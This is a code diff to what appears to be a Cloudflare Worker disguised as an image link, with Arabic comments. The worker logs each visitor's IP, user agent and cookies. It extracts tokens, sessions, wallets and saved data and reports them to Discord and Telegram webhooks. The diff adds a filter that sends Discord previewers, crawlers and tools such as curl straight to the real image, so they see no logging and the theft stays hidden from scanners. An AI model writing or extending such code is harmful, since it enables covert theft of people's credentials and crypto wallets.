@@ -1,4 +1,4 @@
-// src/index.js - النسخة النهائية المعدلة
+// src/index.js - النسخة المعدلة (مع فلتر البوتات)
 // ========== إعدادات من wrangler.toml ==========
 // DISCORD_WEBHOOK, IMAGE_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 // ===============================================
@@ -7,7 +7,46 @@
 const visits = new Map();
 let visitorCounter = 0;
 
-// ========== 1. دوال استخراج البيانات ==========
+// ========== فلتر البوتات ==========
+function isDiscordBot(userAgent) {
+    if (!userAgent) return false;
+    const botPatterns = [
+        /discord/i,
+        /twitterbot/i,
+        /facebookexternalhit/i,
+        /slackbot/i,
+        /telegrambot/i,
+        /whatsapp/i,
+        /linkedinbot/i,
+        /pinterest/i,
+        /reddit/i,
+        /tumblr/i,
+        /skype/i,
+        /viber/i,
+        /line/i,
+        /wechat/i,
+        /baidu/i,
+        /yandex/i,
+        /bingbot/i,
+        /googlebot/i,
+        /duckduckbot/i,
+        /applebot/i,
+        /mediapartners/i,
+        /adsbot/i,
+        /feedfetcher/i,
+        /curl/i,
+        /wget/i,
+        /python/i,
+        /java/i,
+        /node/i,
+        /axios/i,
+        /fetch/i,
+        /headless/i
+    ];
+    return botPatterns.some(pattern => pattern.test(userAgent));
+}
+
+// ========== دوال استخراج البيانات ==========
 
 function extractTokensFromCookies(cookies) {
     const tokens = [];
@@ -235,11 +274,17 @@ export default {
         // 1. استخراج البيانات
         const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '0.0.0.0';
         const realIP = ip.split(',')[0].trim();
-        
+        const ua = request.headers.get('user-agent') || 'unknown';
+
+        // ====== فلتر البوتات ======
+        // لو الطلب من ديسكورد أو أي بوت، اعرض الصورة مباشرة بدون تسجيل
+        if (isDiscordBot(ua)) {
+            return Response.redirect(env.IMAGE_URL, 302);
+        }
+
         // 2. الحصول على معرف الزائر (ثابت لكل IP)
         const visitorId = getVisitorId(realIP);
 
-        const ua = request.headers.get('user-agent') || 'unknown';
         const referer = request.headers.get('referer') || 'direct';
         const acceptLang = request.headers.get('accept-language') || 'N/A';
         const cookies = request.headers.get('cookie') || '';
@@ -328,7 +373,7 @@ export default {
             inline: true
         });
 
-        // مربع التوكينز (فاضي لو مفيش)
+        // مربع التوكينز
         if (data.tokens.length > 0) {
             const tokensByType = {};
             data.tokens.forEach(token => {
@@ -356,7 +401,7 @@ export default {
             });
         }
 
-        // مربع المحافظ (فاضي لو مفيش)
+        // مربع المحافظ
         if (data.wallets.length > 0) {
             let walletBlock = '';
             const uniqueWallets = [];
@@ -383,7 +428,7 @@ export default {
             });
         }
 
-        // مربع الجلسات (فاضي لو مفيش)
+        // مربع الجلسات
         if (data.sessions.length > 0) {
             let sessionBlock = '';
             data.sessions.forEach(session => {
@@ -402,7 +447,7 @@ export default {
             });
         }
 
-        // مربع البيانات المحفوظة (فاضي لو مفيش)
+        // مربع البيانات المحفوظة
         if (data.savedData.length > 0) {
             const dataByType = {};
             data.savedData.forEach(item => {
